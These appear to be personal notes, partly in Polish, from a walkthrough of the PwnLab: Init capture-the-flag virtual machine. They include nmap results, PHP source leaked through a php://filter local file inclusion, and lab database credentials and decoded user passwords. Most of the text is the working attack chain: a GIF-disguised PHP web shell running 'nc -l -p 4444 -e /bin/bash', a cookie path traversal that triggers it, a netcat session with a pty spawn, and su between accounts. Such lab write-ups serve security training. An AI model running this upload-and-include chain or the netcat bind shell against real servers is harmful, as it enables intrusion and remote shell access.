@@ -1,0 +1,341 @@
+
+Starting Nmap 7.11 ( https://nmap.org ) at 2016-08-07 15:51 IST
+Nmap scan report for 192.168.1.2
+Host is up (0.0012s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: PwnLab Intranet Image Hosting
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          39863/udp  status
+|_  100024  1          56877/tcp  status
+3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
+| mysql-info: 
+|   Protocol: 53
+|   Version: 5.5.47-0+deb8u1
+|   Thread ID: 51
+|   Capabilities flags: 63487
+|   Some Capabilities: ConnectWithDatabase, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongColumnFlag, LongPassword, Speaks41ProtocolNew, FoundRows, Speaks41ProtocolOld, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, IgnoreSigpipes, InteractiveClient, ODBCClient, SupportsCompression
+|   Status: Autocommit
+|_  Salt: 0R04T,}UnJfBVk7oLlY[
+56877/tcp open  status  1 (RPC #100024)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.53 seconds
+
+
+1. LFI with php://filter
+
+--- config.php ---
+
+<?php
+$server	  = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";
+?>
+
+
+--- login.php ---
+
+<?php
+session_start();
+require("config.php");
+$mysqli = new mysqli($server, $username, $password, $database);
+
+if (isset($_POST['user']) and isset($_POST['pass']))
+{
+       	$luser = $_POST['user'];
+       	$lpass = base64_encode($_POST['pass']);
+
+       	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
+       	$stmt->bind_param('ss', $luser, $lpass);
+
+       	$stmt->execute();
+       	$stmt->store_Result();
+
+       	if ($stmt->num_rows == 1)
+       	{
+       		$_SESSION['user'] = $luser;
+       		header('Location: ?page=upload');
+       	}
+       	else
+       	{
+       		echo "Login failed.";
+       	}
+}
+else
+{
+       	?>
+       	<form action="" method="POST">
+       	<label>Username: </label><input id="user" type="test" name="user"><br />
+       	<label>Password: </label><input id="pass" type="password" name="pass"><br />
+       	<input type="submit" name="submit" value="Login">
+       	</form>
+       	<?php
+}
+
+
+--- index.php ---
+
+<?php
+//Multilingual. Not implemented yet.
+//setcookie("lang","en.lang.php");
+if (isset($_COOKIE['lang']))
+{
+       	include("lang/".$_COOKIE['lang']);
+}
+// Not implemented yet.
+?>
+<html>
+<head>
+<title>PwnLab Intranet Image Hosting</title>
+</head>
+<body>
+<center>
+<img src="images/pwnlab.png"><br />
+[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
+<hr/><br/>
+<?php
+       	if (isset($_GET['page']))
+       	{
+       		include($_GET['page'].".php");
+       	}
+       	else
+       	{
+       		echo "Use this server to upload and share image files inside the intranet";
+       	}
+?>
+</center>
+</body>
+</html>
+
+--- upload.php ---
+
+<?php
+session_start();
+if (!isset($_SESSION['user'])) { die('You must be log in.'); }
+?>
+<html>
+       	<body>
+       		<form action='' method='post' enctype='multipart/form-data'>
+       			<input type='file' name='file' id='file' />
+       			<input type='submit' name='submit' value='Upload'/>
+       		</form>
+       	</body>
+</html>
+<?php
+if(isset($_POST['submit'])) {
+       	if ($_FILES['file']['error'] <= 0) {
+       		$filename  = $_FILES['file']['name'];
+       		$filetype  = $_FILES['file']['type'];
+       		$uploaddir = 'upload/';
+       		$file_ext  = strrchr($filename, '.');
+       		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
+       		$whitelist = array(".jpg",".jpeg",".gif",".png");
+
+       		if (!(in_array($file_ext, $whitelist))) {
+       			die('Not allowed extension, please upload images only.');
+       		}
+
+       		if(strpos($filetype,'image') === false) {
+       			die('Error 001');
+       		}
+
+       		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
+       			die('Error 002');
+       		}
+
+       		if(substr_count($filetype, '/')>1){
+       			die('Error 003');
+       		}
+
+       		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
+
+       		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
+       			echo "<img src=\"".$uploadfile."\"><br />";
+       		} else {
+       			die('Error 4');
+       		}
+       	}
+}
+
+?>
+
+
+mysql> select * from users;
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ== |
+| mike | U0lmZHNURW42SQ== |
+| kane | aVN2NVltMkdSbw== |
++------+------------------+
+3 rows in set (0.01 sec)
+
+mysql>
+
+
+
+upload shella:
+
+
+POST /?page=upload HTTP/1.1
+Host: 192.168.1.2
+Content-Length: 338
+Cache-Control: max-age=0
+Origin: http://192.168.1.2
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2849.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzKu7nqA1OjocdZOH
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://192.168.1.2/?page=upload
+Accept-Encoding: gzip, deflate
+Accept-Language: pl-PL,pl;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: PHPSESSID=gesnddmtnmh14qvciakpjictp1
+Connection: close
+
+------WebKitFormBoundaryzKu7nqA1OjocdZOH
+Content-Disposition: form-data; name="file"; filename="pwnlab.gif"
+Content-Type: image/gif
+
+GIF89ae
+<?php system('nc -l -p 4444 -e /bin/bash &');?>
+
+------WebKitFormBoundaryzKu7nqA1OjocdZOH
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryzKu7nqA1OjocdZOH--
+
+
+uruchomienie shella:
+
+
+GET /?page=upload HTTP/1.1
+Host: 192.168.1.2
+Content-Length: 0
+Cache-Control: max-age=0
+Origin: http://192.168.1.2
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2849.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://192.168.1.2/?page=login
+Accept-Encoding: gzip, deflate
+Accept-Language: pl-PL,pl;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: PHPSESSID=gesnddmtnmh14qvciakpjictp1;lang=../upload/8986bd4a045ea87e2d439d2e5ed97feb.gif
+Connection: close
+
+
+
+gain access on remote machine:
+
+
+
+bl4de:~/playground $ nc -vv 192.168.1.2 4444
+found 0 associations
+found 1 connections:
+     1:	flags=82<CONNECTED,PREFERRED>
+       	outif en0
+       	src 192.168.1.11 port 65273
+       	dst 192.168.1.2 port 4444
+       	rank info not available
+       	TCP aux info available
+
+Connection to 192.168.1.2 port 4444 [tcp/krb524] succeeded!
+ls -lA
+total 20
+-rwxr-xr-x 1 www-data www-data  105 Mar 16 23:32 config.php
+drwxr-xr-x 2 www-data www-data 4096 Mar 17 10:21 images
+-rwxr-xr-x 1 www-data www-data  623 Mar 16 23:30 index.php
+-rwxr-xr-x 1 www-data www-data  832 Mar 17 11:56 login.php
+lrwxrwxrwx 1 root     root        5 Mar 17 12:03 upload -> /tmp/
+-rwxr-xr-x 1 www-data www-data 1339 Mar 16 23:32 upload.php
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@pwnlab:/var/www/html$ ls -lA
+ls -lA
+total 20
+-rwxr-xr-x 1 www-data www-data  105 Mar 16 23:32 config.php
+drwxr-xr-x 2 www-data www-data 4096 Mar 17 10:21 images
+-rwxr-xr-x 1 www-data www-data  623 Mar 16 23:30 index.php
+-rwxr-xr-x 1 www-data www-data  832 Mar 17 11:56 login.php
+lrwxrwxrwx 1 root     root        5 Mar 17 12:03 upload -> /tmp/
+-rwxr-xr-x 1 www-data www-data 1339 Mar 16 23:32 upload.php
+www-data@pwnlab:/var/www/html$ uptime
+uptime
+ 17:06:59 up 1 day,  2:12,  0 users,  load average: 0.00, 0.01, 0.05
+www-data@pwnlab:/var/www/html$ uname -a
+uname -a
+Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
+www-data@pwnlab:/var/www/html$ cat /etc/motd
+cat /etc/motd
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+www-data@pwnlab:/var/www/html$ clear
+
+
+
+passwords:
+
+kent JWzXuBJJNy
+mike SIfdsTEn6I
+kane iSv5Ym2GRo
+
+
+
+
+www-data@pwnlab:/var/www$ su kent
+su kent
+Password: JWzXuBJJNy
+
+kent@pwnlab:/var/www$ whoami
+whoami
+kent
+kent@pwnlab:/var/www$ cd ~
+cd ~
+kent@pwnlab:~$ ls -lA
+ls -lA
+total 12
+-rw-r--r-- 1 kent kent  220 Mar 17 10:06 .bash_logout
+-rw-r--r-- 1 kent kent 3515 Mar 17 10:06 .bashrc
+-rw-r--r-- 1 kent kent  675 Mar 17 10:06 .profile
+kent@pwnlab:~$
+
+
+kent@pwnlab:~$ su kane
+su kane
+Password: iSv5Ym2GRo
+
+kane@pwnlab:/home/kent$ cd ~
+cd ~
+kane@pwnlab:~$ ls -lA
+ls -lA
+total 20
+-rw-r--r-- 1 kane kane  220 Mar 17 10:09 .bash_logout
+-rw-r--r-- 1 kane kane 3515 Mar 17 10:09 .bashrc
+-rwsr-sr-x 1 mike mike 5148 Mar 17 13:04 msgmike
+-rw-r--r-- 1 kane kane  675 Mar 17 10:09 .profile
+kane@pwnlab:~$
+
+
+Reszta:
+http://blog.safetechinnovations.com/challenges/pwnlabinit-walkthrough/
+
+
+
+
+
+
+
